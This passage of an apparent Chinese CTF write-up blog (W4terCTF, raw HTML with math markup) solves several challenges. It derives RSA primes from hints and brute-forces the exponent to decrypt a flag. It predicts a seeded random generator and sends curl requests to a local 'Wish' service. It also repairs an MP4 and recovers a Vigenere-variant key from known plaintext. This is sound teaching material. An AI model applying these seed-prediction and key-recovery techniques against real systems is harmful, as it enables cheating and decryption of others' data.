style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.8641079999999999em;vertical-align:0"></span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">0</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>q</mi><mo>=</mo><mfrac><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>±</mo><msqrt><mrow><msubsup><mi>h</mi><mn>5</mn><mn>2</mn></msubsup><mo>−</mo><mn>4</mn><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>2</mn></msup></mrow></msqrt></mrow><mrow><mn>2</mn><msup><mi>y</mi><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">q=\frac{h_5\pm\sqrt{h_5^2-4nx^2y^2}}{2y^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:2.51044em;vertical-align:-.8804400000000001em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.63em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord">2</span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.6802em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">±</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.9498em"><span class="svg-align" style="top:-3.2em"><span class="pstrut" style="height:3.2em"></span><span class="mord" style="padding-left:1em"><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.7959080000000001em"><span style="top:-2.433692em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span><span style="top:-3.0448000000000004em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.26630799999999993em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord">4</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.740108em"><span style="top:-2.9890000000000003em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-2.9098em"><span class="pstrut" style="height:3.2em"></span><span class="hide-tail" style="min-width:1.02em;height:1.28em"><svg width="400em" height="1.28em" viewBox="0 0 400000 1296" preserveAspectRatio="xMinYMin slice"><path d="M263,681c0.7,0,18,39.7,52,119
c34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120
c340,-704.7,510.7,-1060.3,512,-1067
l0 -0
c4.7,-7.3,11,-11,19,-11
H40000v40H1012.3
s-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232
c-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1
s-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26
c-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z
M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.2902em"><span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.8804400000000001em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>得到的 q 有两个解，仅保留整数解，然后根据<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mfrac><mi>n</mi><mi>q</mi></mfrac></mrow><annotation encoding="application/x-tex">p=\frac nq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.1764999999999999em;vertical-align:-.481108em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.695392em"><span style="top:-2.6550000000000002em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:.03588em">q</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.394em"><span class="pstrut" style="height:3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.481108em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 得到 p</p><p>现在得到了 pq, 只需要 e 就能求得私钥 d</p><p>因为题目没有直接提供 e, 所以这里需要亿点点枚举</p><p>已知 e 是一个 36 位的素数，枚举时使用 <code>getPrime()</code> 获得</p><p>它需要满足以下条件</p><ul><li><code>GCD(e, (p - 1) * (q - 1)) == 1 and e &lt; (p-1)*(q-1)</code></li><li><code>( reduce(lambda x, y: x * y, range(1, h1 - 1)) * e) % h1 == h2</code> (用到 hint1 和 hint2)</li><li><code>h4 == d % (2 ** (d.bit_length() // 4))</code> (用到 hint4)</li></ul><p>最终代码如下</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">h5 = <span class="number">15237245518187783270118095809520813715956779970121151605236017245281663349927871664089323996437198235332380649056157552139824794588282124241562678460596507994160450297450179528976589398846210519549196888613143426635079434084452257874065484561750625879566967728892028875015732523907566365015585071705383965108584900462347980930243703796275135520452238877712806925535901382203444872746731017403372197551202867519872504341875747056250334169640471053205861370866906946583776837242814046091601932206546117069281206618021968118790407685235602371416190212336628756323090425345962230904747291854448754116455587682431569485503641521272971686704473193019132477953908910849831685148677975221237038065750758015111863632278200747000157187997814194029400697403741838489362003974564359614821068833924840443285823258682774010695163217945524608036622625872746384332883461936945674717452827633809865102717159507550663596896932548991216607522697367537118903992798078936423232478772212951734438159292917127451068031982531631571612297893227345579357245226069692084913823443945826318169121459999393340568902299486793470467510065851569244119435052446898779718050907739373838489841346799589855583093882137549631777101404814967710333142369685932771643559927586884873934944456529776507128155937030841026343151440450761869269196359152094226878375985237603824966654988556567217028134068892779253422300240576637315948429841799367844063885304545920357705733411373493758050263143074535948457</span></span><br><span class="line">x = <span class="number">34834945635419823491817566563399234823053176449889821571800075702352062905044231520196782430564993617886316750841220280683153456634693274516582390418863033711415731372881163288179660369032440262647344962570809308551786423557604581792293023628226671539671001863522824415876161727357840363896909435994314597682318687286109212360132261705780761350223208855493439905713509683216585447535669179103840355151676900348955850726834778558748576176596609474037298456423607570516459873639794526160082489103786303332253388597560031538949333472681857144605196440020688999368156212067614295618998719682195870452330682061061500341728481458877113934526003865064359452801</span></span><br><span class="line">y = <span class="number">109071911012732502022850422978096246932142152916423367258339958080776017127779842287569032054094868715662547617710798972237860865468979518796870762466053422806566269221859683504667443154145089120448705028998733329483536176859312788275313407342047772524898407149610870586148015013605624329594138230714119704939505401061380777712216157719510271261619101362035144616187262082302740411574934586360516695062056563100258177611076242927354475633328163841594305884855770651187471060662561145818768319723133613889115397679168254599526858767478331211008997427364431641348477558436549415894985022330773540762573918592860707967250624976183104841257499345937186160</span></span><br><span class="line">n = <span class="number">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delta2 = h5**<span class="number">2</span>-<span class="number">4</span>*n*x**<span class="number">2</span>*y**<span class="number">2</span></span><br><span class="line">delta = gmpy2.iroot(delta2,<span class="number">2</span>)</span><br><span class="line">delta = <span class="built_in">int</span>(delta[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(delta)</span><br><span class="line"><span class="keyword">if</span> (h5+delta)%(<span class="number">2</span>*y**<span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">    q1=(h5+delta)//(<span class="number">2</span>*y**<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;q1 = <span class="subst">&#123;q1&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (h5-delta)%(<span class="number">2</span>*y**<span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">    </span><br><span class="line">    q2=(h5-delta)//(<span class="number">2</span>*y**<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;q2=<span class="subst">&#123;q2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> n%q2 == <span class="number">0</span>:</span><br><span class="line">    p=n//q2</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">q=q2</span><br><span class="line"><span class="comment"># 求e</span></span><br><span class="line">h1 = <span class="number">150247</span></span><br><span class="line">h2 = <span class="number">102488</span></span><br><span class="line">h4 = <span class="number">44535490898726654427376304836986323627856798106830892558987452614726931403119</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">tmp = reduce(<span class="keyword">lambda</span> x, y: x * y, <span class="built_in">range</span>(<span class="number">1</span>, h1 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    e = getPrime(<span class="number">36</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>)) == <span class="number">1</span> <span class="keyword">and</span> e &lt; (p-<span class="number">1</span>)*(q-<span class="number">1</span>) <span class="keyword">and</span> ( tmp * e) % h1 == h2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;maybe e=<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        d=gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;maybe d=<span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line">        nh4 = d % (<span class="number">2</span> ** (d.bit_length() // <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">if</span> nh4 == h4:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e=<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d=<span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p></p><p>开 8 个线程运行一晚上，成功枚举到正确的 e, 并得到 d</p><p>使用下面的脚本，根据私钥解密密文，得到 flag</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">36905723839</span></span><br><span class="line">d = <span class="number">66781150190539205038154636873316650284846375610597564467113301562207220876080997654261761651771185773920764536611596660709696442562219146865775186656742157829910073552979854383590613522355255045862718785890708775548436159002198598103886840865569957379996409759081212055357149668774721007823047658341778542959</span></span><br><span class="line">n = <span class="number">162908386409122831644601726291514736982460317787650963552042804694858960756247295016072165050452122566555943647913977051861072784403314058088382494116300030479243222291806345961434419243328825539529128842207242691984718290143482242891139352813626310709638170008858946304550631669011725528861157958853032167147</span></span><br><span class="line">c = <span class="number">33087238461387318335074410411142790336660168200231648518849044049333308060938917518277424800358623613184976785426565004507278568420843160272353164463818453523209164535111619601021121321114970839731250362111118957833038271450092546392532900928613625992384890463665974527179679504545602403023570778993190377708</span></span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p></p><p><code>W4terCTF&#123;W47cH_oUT_7He_Smok3_hIn75_1ROM_wll5oN&#125;</code></p><h2 id="wish"><a class="anchor" href="#wish">#</a> Wish</h2><p>查看源代码，看到确定抽取结果的逻辑：</p><p></p><figure class="highlight python"><figcaption><span>app.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_wish</span>(<span class="params">time, index</span>):</span><br><span class="line">    random.seed(time)</span><br><span class="line">    probability = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(index):</span><br><span class="line">        diff = <span class="built_in">min</span>(<span class="built_in">abs</span>(random.randint(<span class="number">0</span>, <span class="number">1919810</span>) - <span class="number">114514</span>), <span class="number">10000</span>)</span><br><span class="line">        probability = <span class="number">100</span> * (<span class="number">0.1</span>) ** diff</span><br><span class="line">    app.logger.info(</span><br><span class="line">        <span class="string">f&#x27;probability: <span class="subst">&#123;probability&#125;</span>, time: <span class="subst">&#123;time&#125;</span>, index: <span class="subst">&#123;index&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>.from_bytes(os.urandom(<span class="number">1</span>), <span class="string">&#x27;little&#x27;</span>) % <span class="number">100</span> + <span class="number">1</span> &lt;= probability:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        characters = string.ascii_letters + string.digits</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p></p><p>发现是利用 <code>time</code> 作为伪随机数序列的初始化种子，要想抽出 flag ，需要 <code>probability</code> 尽可能地大，那么 <code>index</code> 只能取 <code>1</code> ， <code>abs(random.randint(0, 1919810) - 114514)</code> 的值只能为 <code>0</code> 或 <code>1</code> ，所以据此爆破出一个可行的 <code>time</code> ：</p><p></p><figure class="highlight python"><figcaption><span>pwn_time.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = <span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(random.randint(<span class="number">0</span>, <span class="number">1919810</span>) - <span class="number">114514</span>) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p></p><p>得到唯一符合目标的结果： <code>time=20544</code> ，然后就是真的抽 flag ：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET -H &quot;Content-Type:application/octet-stream&quot; http://127.0.0.1:52829/query_reset</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取 3 次 wish 机会</span></span><br><span class="line"></span><br><span class="line">curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;time&quot;:20544,&quot;index&quot;:1&#125;&#x27; http://127.0.0.1:52829/wish</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">抽 flag</span></span><br></pre></td></tr></table></figure><p></p><p><code>W4terCTF&#123;Crack_insteal_of_wish_the_seed_d0ab21251107&#125;</code></p><blockquote><p>即使这样还抽了十几次才出 flag , 好黑的池子！</p></blockquote><h1 id="misc"><a class="anchor" href="#misc">#</a> Misc</h1><h2 id="sign-in"><a class="anchor" href="#sign-in">#</a> Sign In</h2><p>排行榜</p><h2 id="brokenmp4"><a class="anchor" href="#brokenmp4">#</a> broken.mp4</h2><p>按照 record_1.mp4 的指引，找到了文章链接</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05EQVNIL2FydGljbGUvZGV0YWlscy8xMzYxNTE0MTg=">https://blog.csdn.net/NDASH/article/details/136151418</span></p><p>按照文章指引，去 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FudGh3bG9jay91bnRydW5jL3JlbGVhc2VzL3RhZy9sYXRlc3Q=">https://github.com/anthwlock/untrunc/releases/tag/latest</span> 下载所需的软件，选择 <code>untrunc_x64</code></p><p>运行 <code>untrunc-gui</code> , reference file 选 <code>record_1.mp4</code> , truncated file 选 <code>record_2.mp4</code></p><p><img data-src="https://s2.loli.net/2024/04/29/Pn5XoKV7AfyCdEg.png" alt="brokenmp4"></p><p>这样就能得到 <code>record_2.mp4</code> 的修复版，在视频结尾能找到 flag</p><p><code>W4terCTF&#123;L1fe_is_5h0rT_so_i_Us3_MKV_248DF3C&#125;</code></p><h2 id="shuffle-puts"><a class="anchor" href="#shuffle-puts">#</a> Shuffle Puts</h2><p>启动容器，从浏览器访问，可以下载一个文件 meow</p><p>执行下面的命令查看文件中所有字符串</p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings .\meow</span><br></pre></td></tr></table></figure><p></p><p>在输出中可以找到 flag</p><p><code>W4terCTF&#123;sHUFF1e_5hufF1e_FLA6_MEOWmeOWm30W&#125;</code></p><h2 id="revenge-of-vigenere"><a class="anchor" href="#revenge-of-vigenere">#</a> Revenge of Vigenere</h2><p>这题的加密是维吉尼亚密码的一个变种</p><p>连接容器后，只能获得加密后的密文</p><p>解决思路是如果知道原文的一个片段，而且知道完整的密文，可以尝试倒推 KEY。</p><p>原文中存在 W4terCTF 是确定的，可以据此倒退 KEY</p><p>运行下面的代码，根据已知的明文 <code>W4terCTF</code> 和密文 <code>Q4doySZB</code> , 尝试推出密钥的其中连续 7 位</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    recv = <span class="string">&#x27;Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.&#x27;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print(recv)</span></span><br><span class="line">    <span class="comment"># print(len(recv))</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    idx_arr=[]</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> recv:</span><br><span class="line">        <span class="keyword">if</span> ch.isalpha():</span><br><span class="line">            idx_arr.append(index)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx_arr.append(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># print(idx_arr)</span></span><br><span class="line">    start = <span class="number">609</span></span><br><span class="line">    <span class="comment"># start = 0</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="string">&#x27;W4terCTF&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">start, <span class="built_in">min</span></span>):</span><br><span class="line">        <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">min</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.isalpha():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            mi_i = start + i</span><br><span class="line">            mi = recv[mi_i]</span><br><span class="line">            mi_idx=idx_arr[mi_i]</span><br><span class="line">            <span class="keyword">if</span> x.isupper():</span><br><span class="line">                base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            val = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> val:</span><br><span class="line">                <span class="keyword">if</span> (mi_idx+<span class="number">1</span>)%<span class="number">2</span> == <span class="number">1</span> <span class="keyword">and</span> (<span class="built_in">ord</span>(x)-base+mi_idx*(<span class="built_in">ord</span>(v)-<span class="number">65</span>))%<span class="number">26</span> == <span class="built_in">ord</span>(mi)-base <span class="keyword">or</span> (mi_idx+<span class="number">1</span>) % <span class="number">2</span> != <span class="number">1</span> <span class="keyword">and</span> (<span class="built_in">ord</span>(x)-base-mi_idx*(<span class="built_in">ord</span>(v)-<span class="number">65</span>)) % <span class="number">26</span> == <span class="built_in">ord</span>(mi)-base:</span><br><span class="line">                    <span class="built_in">print</span>(v, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;x&#125;</span>,<span class="subst">&#123;mi&#125;</span>,<span class="subst">&#123;mi_idx&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    test(start,<span class="built_in">min</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------&#x27;</span>)</span><br><span class="line">    start=<span class="number">0</span></span><br><span class="line">    <span class="built_in">min</span>=<span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">    <span class="comment"># test(start,min)</span></span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p></p><p>运行结果如下，为密钥其中连续七位可能的取值，每一位可能会出现多种取值，所以有些行有两个字母</p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 